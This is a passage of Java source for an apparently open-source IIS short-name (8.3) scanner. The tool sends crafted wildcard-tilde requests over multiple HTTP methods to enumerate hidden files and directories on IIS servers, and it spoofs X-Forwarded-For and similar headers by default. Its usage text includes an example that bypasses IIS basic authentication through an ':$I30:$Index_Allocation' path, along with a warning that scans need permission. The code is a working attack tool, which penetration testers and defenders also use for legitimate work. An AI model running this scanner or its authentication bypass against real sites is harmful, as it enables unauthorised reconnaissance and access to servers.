/*
 * // IIS Shortname Scanner
 * // Released as open source by Soroush Dalili (@irsdl)
 * // Researched & developed by Soroush Dalili (@irsdl)
 * // Project link: https://github.com/irsdl/IIS-ShortName-Scanner
 * // Released under AGPL see LICENSE for more information
 */

package iisShortNameScanner;

import org.apache.commons.text.StringEscapeUtils;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager;
import org.apache.hc.client5.http.socket.ConnectionSocketFactory;
import org.apache.hc.client5.http.socket.PlainConnectionSocketFactory;
import org.apache.hc.client5.http.ssl.NoopHostnameVerifier;
import org.apache.hc.client5.http.ssl.SSLConnectionSocketFactory;
import org.apache.hc.core5.http.Header;
import org.apache.hc.core5.http.HttpEntity;
import org.apache.hc.core5.http.HttpHost;
import org.apache.hc.core5.http.config.Registry;
import org.apache.hc.core5.http.config.RegistryBuilder;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.io.entity.StringEntity;
import org.apache.hc.core5.http.message.BasicClassicHttpRequest;
import org.apache.hc.core5.http.message.BasicHeader;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.nio.charset.CodingErrorAction;
import java.nio.charset.StandardCharsets;
import java.nio.charset.UnsupportedCharsetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager.DEFAULT_MAX_CONNECTIONS_PER_ROUTE;
import static org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager.DEFAULT_MAX_TOTAL_CONNECTIONS;

public class IISShortNameScannerTool {
    /* Do not change the below lines if it's Greek to you!*/

    private static boolean debugMode;
    private static boolean saveOutput;
    private static String outputFile;
    private static boolean isOutputFileChecked;
    private static boolean hassleFree;
    private static String customUserAgent;
    private static String customCookie;
    private static String additionalQuery;
    private static String scanList;
    private static int maxConnectionTimeOut;
    private static int maxRetryTimes;
    private static String proxyServerName;
    private static int proxyServerPort;
    private static Long maxDelayAfterEachRequest;
    private static String questionMarkSymbol;
    private static String asteriskSymbol;
    private static String magicFileName;
    private static String magicFileExtension;
    private static String[] magicFinalPartList;
    private static String[] additionalHeaders;
    private static String[] requestMethod;
    private static int ignoreHeaderLevel;
    private static int ignoreBodyLevel;
    private static int acceptableDifferenceLengthBetweenResponses;
    private static boolean onlyCheckForVulnerableSite = false;
    private static String configFile = "config.xml";
    private final static String strVersion = "2023.3";
    public Set<String> finalResultsFiles = new TreeSet<>();
    public Set<String> finalResultsDirs = new TreeSet<>();
    private static String[] arrayScanList;
    private String[] arrayScanListExt;
    private String[] arrayScanListName;
    private Set<String> scanListName = new TreeSet<>();
    private Set<String> scanListExtension = new TreeSet<>();
    private final static String[] marker = {"[-]", "[\\]", "[|]", "[/]"}; // To show the progress
    private static String destURL;
    private static ShowProgressMode currentShowProgressMode;
    private static int concurrentThreads;
    private String magicFinalPart;
    private String reliableRequestMethod;

    private List<String> validStatusList = new ArrayList<>();
    private List<String> invalidStatusList = new ArrayList<>();
    private boolean isQuestionMarkReliable = false;
    private boolean isExtensionReliable = false;
    private int threadCounter = 0;
    private ThreadPool threadPool = new ThreadPool(0);
    private long reqCounter = 0;
    private Proxy proxy;
    private int sleepTime = 2; // 2 seconds sleep when we have network error!
    private boolean isNetworkReliable = true;
    CloseableHttpClient httpClient = null;
    private static String nameStartsWith = "";
    private static String extStartsWith = "";
    private static int maxNumericalPart = 4; // 9 in Windows 95, 98, ME
    private static int forceNumericalPart = 1;
    private static boolean showActualNames;
    private static boolean isLastFolderIgnored = false;
    private static boolean useProvidedURLWithoutChange;
    private static boolean performUrlEncoding;

    private static int minVulnerableCheckRepeat;


    public static void main(String[] args) {
        // Get URL from input!
        IISShortNameScannerTool obj = new IISShortNameScannerTool();

        try {
            if (args.length <= 4) {
                Console console = System.console();
                String url = "";
                if (args.length == 0) {
                    // To help users to select proper values after execution
                    showUsage();
                    if (console != null) {
                        url = console.readLine("What is the target (e.g. http://localhost:8080/folder/)? ");
                        if (url.length() > 5) {

                            String _hasNewConfigFile = console.readLine("Do you want to use a new config file [Y=Yes, Anything Else=No]? ");

                            if (_hasNewConfigFile.equalsIgnoreCase("y") || _hasNewConfigFile.equalsIgnoreCase("yes")) {
                                String _newConfigFile = console.readLine("New config file?");
                                if (!_newConfigFile.equals(""))
                                    configFile = _newConfigFile;
                            }

                            String _onlyCheckForVulnerableSiteString = console.readLine("Do you want to only verify whether or not the target is vulnerable "
                                    + "without scanning it thoroughly [Y=Yes, Anything Else=No]? ");
                            if (_onlyCheckForVulnerableSiteString.equalsIgnoreCase("y") || _onlyCheckForVulnerableSiteString.equalsIgnoreCase("yes")) {
                                onlyCheckForVulnerableSite = true;
                                currentShowProgressMode = ShowProgressMode.ALL;
                                concurrentThreads = 0;
                            } else {
                                String _scanMode = console.readLine("Scan Mode [0=Show final results only, 1=Show final results step by step, 2=Show Progress (default)]? ");
                                switch (_scanMode) {
                                    case "0" -> currentShowProgressMode = ShowProgressMode.FINALRESULT;
                                    case "1" -> currentShowProgressMode = ShowProgressMode.PARTIALRESULT;
                                    default -> currentShowProgressMode = ShowProgressMode.ALL;
                                }


                                String _concurrentThreadsString = console.readLine("Number of threads [0-50 (20 default)]? ");
                                if (!_concurrentThreadsString.equals("") && obj.isInteger(_concurrentThreadsString)) {
                                    int _concurrentThreads = Integer.parseInt(_concurrentThreadsString);
                                    if (_concurrentThreads >= 0 && _concurrentThreads <= 50) {
                                        concurrentThreads = _concurrentThreads;
                                    } else {
                                        concurrentThreads = 20;
                                    }
                                } else {
                                    concurrentThreads = 20;
                                }
                            }

                        }
                    }
                } else {

                    // custom config file
                    if (args.length == 2 || args.length == 4) {
                        configFile = args[args.length - 1];
                    }

                    if (args.length == 1 || args.length == 2) {
                        // Only check for a vulnerable target
                        onlyCheckForVulnerableSite = true;
                        url = args[0];
                        currentShowProgressMode = ShowProgressMode.FINALRESULT;
                        concurrentThreads = 0;
                    } else {
                        // Full Scan Mode
                        if (args[0].equals("0")) {
                            currentShowProgressMode = ShowProgressMode.FINALRESULT; // Just show the final results
                        } else if (args[0].equals("1")) {
                            currentShowProgressMode = ShowProgressMode.PARTIALRESULT; // Just show the findings one by one
                        } else {
                            currentShowProgressMode = ShowProgressMode.ALL; // Show progress
                        }
                        concurrentThreads = Integer.parseInt(args[1]);
                        if (concurrentThreads < 0) {
                            concurrentThreads = 0;
                        }

                        if (concurrentThreads > 0 && currentShowProgressMode.equals(ShowProgressMode.ALL)) {
                            //showProgress = 1; // Show progress may not work beautifully in Multithread mode, but I like it!
                        }

                        url = args[2];
                    }
                }

                // Load the config file
                loadConfig();

                // Basic check for the URL
                if (url.length() < 8) throw new Exception("URL is too short!"); // URL is too short
                if (!useProvidedURLWithoutChange) {
                    if (url.indexOf("?") > 0)
                        url = url.substring(0, url.indexOf("?"));
                    if (url.indexOf(";") > 0)
                        url = url.substring(0, url.indexOf(";"));
                    if (!url.endsWith("/") && url.lastIndexOf("/") < 8)
                        url += "/"; // add slash after the domain to the root dir
                    if (!url.endsWith("/"))
                        isLastFolderIgnored = true;
                }


                destURL = url;

                if (!useProvidedURLWithoutChange)
                    destURL = destURL.substring(0, destURL.lastIndexOf("/") + 1);

                if (destURL.length() < 8) throw new Exception(); // URL is too short

                // show some outputs
                showOutputs("-- Current Configuration -- Begin", ShowProgressMode.PARTIALRESULT);
                showOutputs("Scan Mode: " + currentShowProgressMode.toString(), ShowProgressMode.PARTIALRESULT);
                showOutputs("Number of threads: " + concurrentThreads, ShowProgressMode.PARTIALRESULT);
                showOutputs("Config file: " + configFile, ShowProgressMode.PARTIALRESULT);
                showOutputs("Scanner version: " + strVersion, ShowProgressMode.PARTIALRESULT);


                // show some outputs
                showOutputs("-- Current Configuration -- End", ShowProgressMode.PARTIALRESULT);

                arrayScanList = scanList.split("");

                // Delay after each request
                if (maxDelayAfterEachRequest == 0 && !hassleFree) {
                    if (console != null) {
                        String delayMilliseconds = console.readLine("How much delay do you want after each request in milliseconds [default=0]? ");
                        if (!delayMilliseconds.equals("") && obj.isLong(delayMilliseconds)) {
                            maxDelayAfterEachRequest = Long.parseLong(delayMilliseconds);
                            if (maxDelayAfterEachRequest < 0) {
                                maxDelayAfterEachRequest = (long) 0;
                            }
                        }
                    }
                }

                showOutputs("Max delay after each request in milliseconds = " + String.valueOf(maxDelayAfterEachRequest), ShowProgressMode.PARTIALRESULT);

                // Proxy server setting
                if ((Objects.equals(proxyServerName, "") || proxyServerPort == 0) && !hassleFree) {
                    if (console != null) {
                        String hasProxy = console.readLine("Do you want to use proxy [Y=Yes, Anything Else=No]? ");
                        if (hasProxy.equalsIgnoreCase("y") || hasProxy.equalsIgnoreCase("yes")) {
                            String _proxyServerName = console.readLine("Proxy server Name? (enter for 127.0.0.1)");
                            if(_proxyServerName.isBlank()){
                                _proxyServerName = "127.0.0.1";
                            }

                            String _proxyServerPort = console.readLine("Proxy server port number? (leave empty to cancel use of a proxy) ");
                            if (!_proxyServerPort.isBlank() && obj.isInteger(_proxyServerPort)) {
                                // We can set the proxy server now
                                proxyServerName = _proxyServerName;
                                proxyServerPort = Integer.parseInt(_proxyServerPort);
                                if (proxyServerPort <= 0 || proxyServerPort > 65535) {
                                    proxyServerName = "";
                                    proxyServerPort = 0;
                                }
                            }

                            if(proxyServerPort == 0){
                                showOutputs("Proxy server has been ignored.");
                            }

                        }
                    }
                }

                if (!proxyServerName.equals(""))
                    showOutputs("\rProxy Server:" + proxyServerName + ":" + String.valueOf(proxyServerPort) + "\r\n", ShowProgressMode.PARTIALRESULT);
                else
                    showOutputs("\rNo proxy has been used.\r\n", ShowProgressMode.PARTIALRESULT);

                // Beginning...
                Date start_date = new Date();

                showOutputs("\rScanning...\r\n", ShowProgressMode.PARTIALRESULT);

                // Start scanning ...
                obj.doScan();
                Date end_date = new Date();
                long l1 = start_date.getTime();
                long l2 = end_date.getTime();
                long difference = l2 - l1;


                // ...Finished
                showOutputs("\r\n\rFinished in: " + difference / 1000 + " second(s)", ShowProgressMode.PARTIALRESULT);

                if (console != null && args.length == 0) {
                    // pause for output
                    console.readLine("\r\nPress ENTER to quit...");
                }
            } else {
                showUsage();
            }

        } catch (Exception err) {
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            } else {
                if (System.console() != null)
                    showOutputs("An error has occurred: " + err.getMessage(), OutputType.ERROR);
                if (args.length != 0) showUsage();
            }
        }
    }

    private static void loadConfig() throws Exception {
        try {
            File file = new File(configFile);
            FileInputStream fileInput = new FileInputStream(file);
            Properties properties = new Properties();

            properties.loadFromXML(fileInput);
            fileInput.close();

            Enumeration<?> enuKeys = properties.keys();
            String additionalHeadersDelimiter = "";
            String additionalHeadersString = "";
            String magicFinalPartDelimiter = "";
            String magicFinalPartStringList = "";
            String requestMethodDelimiter = "";
            String requestMethodString = "";

            StringBuilder configTextResult = new StringBuilder();

            while (enuKeys.hasMoreElements()) {
                String key = (String) enuKeys.nextElement();
                String value = properties.getProperty(key);

                switch (key.toLowerCase()) {
                    case "debug" -> {
                        try {
                            debugMode = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            debugMode = false;
                        }
                    }
                    case "saveoutput" -> {
                        try {
                            saveOutput = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            saveOutput = false;
                        }
                    }
                    case "outputfile" -> {
                        outputFile = properties.getProperty(key, "iis_shortname_scanner_logfile.txt");
                        isOutputFileChecked = false;
                    }
                    case "hasslefree" -> {
                        try {
                            hassleFree = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            hassleFree = true;
                        }
                    }
                    case "useragent" ->
                            customUserAgent = properties.getProperty(key, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10");
                    case "cookies" -> customCookie = properties.getProperty(key, "IIS_ShortName_Scanner=1");
                    case "headersdelimiter" -> additionalHeadersDelimiter = properties.getProperty(key, "@@");
                    case "headers" ->
                            additionalHeadersString = properties.getProperty(key, "X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1");
                    case "urlsuffix" ->
                            additionalQuery = properties.getProperty(key, "?aspxerrorpath=/&aspxerrorpath=/");
                    case "inscopecharacters" ->
                            scanList = properties.getProperty(key, "ETAONRISHDLFCMUGYPWBVKJXQZ0123456789!#$%&'()-@^_`{}~");
                    case "maxconnectiontimeout" -> {
                        try {
                            maxConnectionTimeOut = Integer.parseInt(properties.getProperty(key, "20000"));
                        } catch (Exception e) {
                            maxConnectionTimeOut = 20000;
                        }
                        if(maxConnectionTimeOut < 0)
                            maxConnectionTimeOut = 0;
                    }
                    case "maxretrytimes" -> {
                        try {
                            maxRetryTimes = Integer.parseInt(properties.getProperty(key, "10"));
                        } catch (Exception e) {
                            maxRetryTimes = 10;
                        }
                        if(maxRetryTimes < 0)
                            maxRetryTimes = 0;
                    }
                    case "proxyservername" -> proxyServerName = properties.getProperty(key, "");
                    case "proxyserverport" -> {
                        try {
                            proxyServerPort = Integer.parseInt(properties.getProperty(key, "0"));
                        } catch (Exception e) {
                            proxyServerPort = 0;
                        }
                        if(proxyServerPort < 0 || proxyServerPort > 65535)
                            proxyServerPort = 0;
                    }
                    case "maxdelayaftereachrequest" -> {
                        try {
                            maxDelayAfterEachRequest = Long.parseLong(properties.getProperty(key, "0"));
                        } catch (Exception e) {
                            maxDelayAfterEachRequest = (long) 0;
                        }
                        if(maxDelayAfterEachRequest < 0)
                            maxDelayAfterEachRequest = (long) 0;
                    }
                    case "magicfinalpartdelimiter" -> magicFinalPartDelimiter = properties.getProperty(key, ",");
                    case "magicfinalpartlist" ->
                            magicFinalPartStringList = properties.getProperty(key, "\\a.asp,/a.asp,\\a.aspx,/a.aspx,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/a.xxx");
                    case "questionmarksymbol" -> questionMarkSymbol = properties.getProperty(key, "?");
                    case "asterisksymbol" -> asteriskSymbol = properties.getProperty(key, "*");
                    case "magicfilename" -> magicFileName = properties.getProperty(key, "*~1*");
                    case "magicfileextension" -> magicFileExtension = properties.getProperty(key, "*");
                    case "requestmethoddelimiter" -> requestMethodDelimiter = properties.getProperty(key, ",");
                    case "requestmethod" ->
                            requestMethodString = properties.getProperty(key, "OPTIONS,GET,POST,HEAD,TRACE,TRACK,DEBUG");
                    case "acceptabledifferencelengthbetweenresponses" -> {
                        try {
                            acceptableDifferenceLengthBetweenResponses = Integer.parseInt(properties.getProperty(key, "5"));
                        } catch (Exception e) {
                            acceptableDifferenceLengthBetweenResponses = -1;
                        }

                        if(acceptableDifferenceLengthBetweenResponses < 0)
                            acceptableDifferenceLengthBetweenResponses = -1;
                    }
                    case "ignoreheaderlevel" -> {
                        try {
                            ignoreHeaderLevel = Integer.parseInt(properties.getProperty(key, "2"));
                        } catch (Exception e) {
                            ignoreHeaderLevel = 2;
                        }
                        if(ignoreHeaderLevel>3)
                            ignoreHeaderLevel = 3;
                        else if(ignoreHeaderLevel < 0)
                            ignoreHeaderLevel = 0;
                    }
                    case "ignorebodylevel" -> {
                        try {
                            ignoreBodyLevel = Integer.parseInt(properties.getProperty(key, "1"));
                        } catch (Exception e) {
                            ignoreBodyLevel = 1;
                        }
                        if(ignoreBodyLevel>1)
                            ignoreBodyLevel = 1;
                        else if(ignoreBodyLevel < 0)
                            ignoreBodyLevel = 0;
                    }
                    case "namestartswith" -> {
                        nameStartsWith = properties.getProperty(key, "");
                        if (nameStartsWith.length() > 5) {
                            nameStartsWith = nameStartsWith.substring(0, 5);
                        }
                    }
                    case "extstartswith" -> {
                        extStartsWith = properties.getProperty(key, "");
                        if (extStartsWith.length() > 2) {
                            extStartsWith = extStartsWith.substring(0, 3);
                        }
                    }
                    case "maxnumericalpart" -> {
                        maxNumericalPart = Integer.parseInt(properties.getProperty(key, "4"));
                        if (maxNumericalPart < 1) maxNumericalPart = 1; // set to minimum
                    }
                    case "forcenumericalpart" -> {
                        forceNumericalPart = Integer.parseInt(properties.getProperty(key, "1"));
                        if (forceNumericalPart < 1) forceNumericalPart = 1; // set to minimum
                    }
                    case "showactualnames" -> {
                        try {
                            showActualNames = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            showActualNames = true;
                        }
                    }
                    case "useprovidedurlwithoutchange" -> {
                        try {
                            useProvidedURLWithoutChange = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            useProvidedURLWithoutChange = false;
                        }
                    }
                    case "performurlencoding" -> {
                        try {
                            performUrlEncoding = Boolean.parseBoolean(properties.getProperty(key));
                        } catch (Exception e) {
                            performUrlEncoding = false;
                        }
                    }
                    case "minvulnerablecheckrepeat" -> {
                        minVulnerableCheckRepeat = Integer.parseInt(properties.getProperty(key, "3"));
                        if (minVulnerableCheckRepeat < 1) minVulnerableCheckRepeat = 1; // set to minimum
                    }
                    default -> showOutputs("Unknown item in config file: " + key);
                }
                if (Objects.equals(value, "")) value = "Default";
                configTextResult.append(key).append(": ").append(value).append("\r\n");
            }

            showOutputs(configTextResult.toString(), ShowProgressMode.PARTIALRESULT);

            if(acceptableDifferenceLengthBetweenResponses >=0 && ignoreHeaderLevel <= 1 && ignoreBodyLevel == 0){
                acceptableDifferenceLengthBetweenResponses = -1;
                showOutputs("acceptableDifferenceLengthBetweenResponses has been set to -1 as header and body are being ignored in comparison", OutputType.DEBUG);
            }

            additionalHeaders = additionalHeadersString.split(additionalHeadersDelimiter);
            magicFinalPartList = magicFinalPartStringList.split(magicFinalPartDelimiter);
            requestMethod = requestMethodString.split(requestMethodDelimiter);
            if (forceNumericalPart > maxNumericalPart) {
                maxNumericalPart = forceNumericalPart;
            }
        } catch (FileNotFoundException e) {
            showOutputs("Error: config file was not found: " + configFile, OutputType.ERROR);
            throw new Exception();
        } catch (IOException err) {
            showOutputs("Error in loading config file: " + configFile, OutputType.ERROR);
            StringWriter sw = new StringWriter();
            err.printStackTrace(new PrintWriter(sw));
            String exceptionAsString = sw.toString();
            showOutputs(exceptionAsString, OutputType.ERROR);
            throw new Exception();
        }
    }

    private static void showUsage() {
        char[] delimiter = new char[120];
        Arrays.fill(delimiter, '*');
        showOutputs("");
        showOutputs(String.valueOf(delimiter));

        showOutputs(" _____ _____ _____   _____ _                _     _   _                        _____                                 \r\n"
                + "|_   _|_   _/  ___| /  ___| |              | |   | \\ | |                      /  ___|                                \r\n"
                + "  | |   | | \\ `--.  \\ `--.| |__   ___  _ __| |_  |  \\| | __ _ _ __ ___   ___  \\ `--.  ___ __ _ _ __  _ __   ___ _ __ \r\n"
                + "  | |   | |  `--. \\  `--. \\ '_ \\ / _ \\| '__| __| | . ` |/ _` | '_ ` _ \\ / _ \\  `--. \\/ __/ _` | '_ \\| '_ \\ / _ \\ '__|\r\n"
                + " _| |_ _| |_/\\__/ / /\\__/ / | | | (_) | |  | |_  | |\\  | (_| | | | | | |  __/ /\\__/ / (_| (_| | | | | | | |  __/ |  \r\n"
                + " \\___/ \\___/\\____/  \\____/|_| |_|\\___/|_|   \\__| \\_| \\_/\\__,_|_| |_| |_|\\___| \\____/ \\___\\__,_|_| |_|_| |_|\\___|_| \r\n");
        showOutputs("\r\n* IIS Short Name (8.3) Scanner \r\n* by Soroush Dalili - @irsdl");
        showOutputs("* Version: " + strVersion);
        showOutputs("* WARNING: You are only allowed to run the scanner against the websites which you have given permission to scan.\r\n"
                + "   We do not accept any responsibility for any damage/harm that this application causes to your computer,\r\n"
                + "   or your network as it is only a proof of concept and may lead to unknown issues.\r\n"
                + "   It is your responsibility to use this code legally and you are not allowed to sell this code in any way.\r\n"
                + "   The programmer is not responsible for any illegal or malicious use of this code. Be Ethical! \r\n");

        showOutputs(String.valueOf(delimiter));
        showOutputs("\r\nUSAGE 1 (To verify if the target is vulnerable with the default config file):\r\n java -jar iis_shortname_scanner.jar [URL]\r\n");
        showOutputs("\r\nUSAGE 2 (To find 8.3 file names with the default config file):\r\n java -jar iis_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL]\r\n");
        showOutputs("\r\nUSAGE 3 (To verify if the target is vulnerable with a new config file):\r\n java -jar iis_shortname_scanner.jar [URL] [configFile]\r\n");
        showOutputs("\r\nUSAGE 4 (To find 8.3 file names with a new config file):\r\n java -jar iis_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL] [configFile]\r\n");
        showOutputs("DETAILS:");
        showOutputs(" [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress");
        showOutputs(" [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]");
        showOutputs(" [URL]: A complete URL - starts with http/https protocol");
        showOutputs(" [configFile]: path to a new config file which is based on config.xml\r\n\r\n");
        showOutputs("- Example 0 (to see if the target is vulnerable):\r\n java -jar iis_shortname_scanner.jar http://example.com/folder/\r\n");
        showOutputs("- Example 1 (uses no thread - very slow):\r\n java -jar iis_shortname_scanner.jar 2 0 http://example.com/folder/new%20folder/\r\n");
        showOutputs("- Example 2 (uses 20 threads - recommended):\r\n java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/new%20folder/\r\n");
        showOutputs("- Example 3 (saves output in a text file):\r\n java -jar iis_shortname_scanner.jar 0 20 http://example.com/folder/new%20folder/ > c:\\results.txt\r\n");
        showOutputs("- Example 4 (bypasses IIS basic authentication):\r\n java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/\r\n");
        showOutputs("- Example 5 (using a new config file):\r\n java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/ newconfig.xml \r\n");
        showOutputs("Note 1: Edit config.xml file to change the scanner settings, for instance to add additional headers.");
        showOutputs("Note 2: Sometimes it does not work for the first time and you need to try again.");
        showOutputs(String.valueOf(delimiter));
    }

    private void doScan() throws Exception {
        magicFileName = magicFileName.replace("*", asteriskSymbol);
        magicFileExtension = magicFileExtension.replace("*", asteriskSymbol);

        boolean isVulnerableResult = false;
        // Create the proxy string
        if (!proxyServerName.equals("") && proxyServerPort > 0) {
            proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyServerName, proxyServerPort));
        }

        for (String s1 : magicFinalPartList) {
            for (String s2 : requestMethod) {
                magicFinalPart = s1;
                reliableRequestMethod = s2;
                showOutputs("Testing request method: \"" + s2 + "\" with magic part: \"" + s1 + "\" ...", ShowProgressMode.PARTIALRESULT);


                isVulnerableResult = isVulnerable();
                if (isVulnerableResult) {
                    if (onlyCheckForVulnerableSite) {
                        break;
                    } else {
                        showOutputs("Early result: the target is probably vulnerable.");
                        isQuestionMarkReliable = isQuestionMarkReliable();
                        if (concurrentThreads == 0) {
                            iterateScanFileNameLegacy("");
                        } else {
                            //Done: 1- purify the number in ~1 to reduce the maximum if for example it should only go as high as 1
                            //TODO: 2- find list of valid extensions first, then apply them to identified names -> if no extensions exist, they are all directories
                            //TODO: 3- send a request to the shortname file and its extension to see whether it can be served directly (this is when a file has been actually saved with its shortname)
                            //TODO: 4- try to guess a complete extension based on a predefined list of all potential extensions
                            //TODO: 5- Show those files having 4 Letter Hex after first 2 letters
                            scanListPurifier();
                            threadPool = new ThreadPool(concurrentThreads);
                            incThreadCounter(1);
                            threadPool.runTask(multithread_iterateScanFileName(""));
                        }
                    }
                    break;
                }
            }
            if (isVulnerableResult) break;
        }

        while (threadCounter != 0) {
            Thread.sleep(1);
        }
        threadPool.join();
        if (!currentShowProgressMode.equals(ShowProgressMode.FINALRESULT))
            showOutputs("");
        showOutputs("# IIS Short Name (8.3) Scanner version " + strVersion + " - scan initiated " + (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date()));
        showOutputs("Target: " + destURL);
        if (!isVulnerableResult)
            showOutputsTree("Result: Not vulnerable or no item was found. It was not possible to get proper/different error messages from the server. Check the inputs and try again.", 0);
        else {
            showOutputsTree("Result: Vulnerable!", 0);
            showOutputsTree("Used HTTP method: " + reliableRequestMethod, 0);
            showOutputsTree("Suffix (magic part): " + magicFinalPart, 0);
        }

        // Warnings
        List<String> warningStrings = new ArrayList<>();
        if (isLastFolderIgnored)
            warningStrings.add("URL does not end with a slash character (/) - last folder was ignored!");
        if (!destURL.toLowerCase().startsWith("http://") && !destURL.toLowerCase().startsWith("https://"))
            warningStrings.add("URL does not start with HTTP:// or HTTPS:// protocol - this may fail the scanner completely!");
        // Only shows more warnings when we are trying to get files/folders as well
        if (!onlyCheckForVulnerableSite) {
            // Show message for boolIsQuestionMarkReliable
            if (!isQuestionMarkReliable) {
                warningStrings.add("Question mark character was blocked: you may have a lot of false positives. -> manual check is needed.");
            }
            // Show message for boolIsExtensionReliable
            if (!isExtensionReliable) {
                warningStrings.add("File extensions could not be verified. you may have false positive results. -> manual check is needed.");
            }

            // Show message when there was network error
            if (!isNetworkReliable) {
                warningStrings.add("Some network problems were detected and the results can be unreliable. Please try again with less threads.");
            }
        }
        if (warningStrings.size() > 0) {

            showOutputsTree("Warning(s):", 0);
            for (String strWarning : warningStrings) {
                showOutputsTree(strWarning, 1);
            }
        }


        //showOutputs("\r\n\r\n--------- Final Result ---------");
        showOutputsTree("Extra information:", 0);

        //showOutputs(getReqCounter() + " requests have been sent to the server:");
        showOutputsTree("Number of sent requests: " + getReqCounter(), 1);
        if (!finalResultsDirs.isEmpty() || !finalResultsFiles.isEmpty()) {

            showOutputsTree("Identified directories: " + finalResultsDirs.size(), 1);
            for (String s : finalResultsDirs) {
                String currentName = s;
                showOutputsTree(s, 2);
                String currentExt = "";
                if (s.length() - s.lastIndexOf(".") <= 3) {
                    currentName = s.substring(0, s.lastIndexOf("."));
                    currentExt = s.substring(s.lastIndexOf("."));
                }
                if (showActualNames) {
                    if (currentName.lastIndexOf("~") < 6) {
                        if (currentName.lastIndexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")) {
                            showOutputsTree("Possible directory name = " + s.substring(0, currentName.lastIndexOf("~")), 3);
                        } else {
                            showOutputsTree("Actual directory name = " + s.substring(0, currentName.lastIndexOf("~")), 3);
                        }
                    }
                    if (s.length() - s.lastIndexOf(".") <= 3)
                        showOutputsTree("Actual extension = " + currentExt, 3);
                }


            }

            showOutputsTree("Identified files: " + finalResultsFiles.size(), 1);
            for (String s : finalResultsFiles) {
                String currentName = s;
                showOutputsTree(s, 2);
                String currentExt = "";
                if (s.length() - s.lastIndexOf(".") <= 3) {
                    currentName = s.substring(0, s.lastIndexOf("."));
                    currentExt = s.substring(s.lastIndexOf("."));
                }
                if (showActualNames) {
                    if (currentName.lastIndexOf("~") < 6) {
                        if (currentName.lastIndexOf("~") == 5 && s.matches("^[a-fA-F0-9]{5}.*")) {
                            showOutputsTree("Possible file name = " + s.substring(0, currentName.lastIndexOf("~")), 3);
                        } else {
                            showOutputsTree("Actual file name = " + s.substring(0, currentName.lastIndexOf("~")), 3);
                        }
                    }
                    if (s.length() - s.lastIndexOf(".") <= 3)
                        showOutputsTree("Actual extension = " + currentExt, 3);
                }

            }
        }

        //showOutputs(finalResultsDirs.size() + " Dir(s) was/were found");
        //showOutputs(finalResultsFiles.size() + " File(s) was/were found\r\n");

    }

    private void scanListPurifier() {
        try {
            ThreadPool localThreadPool = new ThreadPool(concurrentThreads);
            localThreadPool.runTask(multithread_FindingTildeMaxNumber());

            for (String s : arrayScanList) {
                if (nameStartsWith.length() < 6)
                    localThreadPool.runTask(multithread_NameCharPurifier(s));

                if (isExtensionReliable && extStartsWith.length() < 3) {
                    localThreadPool.runTask(multithread_ExtensionCharPurifier(s));
                }
            }
            localThreadPool.join();
            arrayScanListName = scanListName.toArray(new String[0]);
            showOutputs("Identified letters in names: " + String.join(",", arrayScanListName), OutputType.DEBUG);
            if (isExtensionReliable) {
                arrayScanListExt = scanListExtension.toArray(new String[0]);
                showOutputs("Identified letters in extensions: " + String.join(",", arrayScanListExt), OutputType.DEBUG);
            }

        } catch (Exception err) {
            if (debugMode) {
                StringWriter sw = new StringWriter();
                err.printStackTrace(new PrintWriter(sw));
                String exceptionAsString = sw.toString();
                showOutputs(exceptionAsString, OutputType.ERROR);
            }
        }
    }

    private Runnable multithread_FindingTildeMaxNumber() {
        return new Runnable() {
            @Override
            public void run() {
                try {
                    showOutputs("Finding maximum number after ~", OutputType.DEBUG);
                    for (int i = 1; i <= maxNumericalPart; i++) {
                        String statusCode = getStatus("/" + nameStartsWith + asteriskSymbol + "~" + i + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list
                        if (statusCode.equals("invalid")) {
                            maxNumericalPart = i - 1;
                            break;
                        }
                    }
                } catch (Exception err) {
                    if (debugMode) {
                        StringWriter sw = new StringWriter();
                        err.printStackTrace(new PrintWriter(sw));
                        String exceptionAsString = sw.toString();
                        showOutputs(exceptionAsString, OutputType.ERROR);
                    }
                }
                decThreadCounter(1);
            }
        };
    }

